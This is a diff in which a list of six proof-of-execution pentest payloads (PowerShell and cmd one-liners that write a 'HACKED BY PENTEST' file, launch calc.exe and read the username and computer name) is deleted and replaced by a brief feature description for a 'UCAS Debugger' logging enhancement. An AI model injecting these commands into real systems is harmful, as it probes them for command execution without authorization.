@@ -1,17 +1,4 @@
-PAYLOAD A - File Creation (Proof of Execution):
-POWERSHELL "NEW-ITEM -PATH C:\WINDOWS\TEMP\EXPLOITED.TXT -ITEMTYPE FILE"
+UCAS Debugger
 
-PAYLOAD B - Write to File:
-POWERSHELL "ADD-CONTENT -PATH C:\WINDOWS\TEMP\DATA.TXT -VALUE 'HACKED BY PENTEST'"
-
-PAYLOAD C - Run Calculator:
-CMD /C CALC.EXE
-
-PAYLOAD D - Get Username:
-POWERSHELL "[ENVIRONMENT]::USERNAME"
-
-PAYLOAD E - Get Computer Name:
-POWERSHELL "[ENVIRONMENT]::COMPUTERNAME"
-
-PAYLOAD F - List Files:
-CMD /C DIR C:\WINDOWS\TEMP\
+    * Description: An enhancement to the existing logger to introduce a debugging feature that indicates method start, key function metrics (e.g., # of results received), and method stop
+    * Impact: Quicker error debugging and error resolution times. 
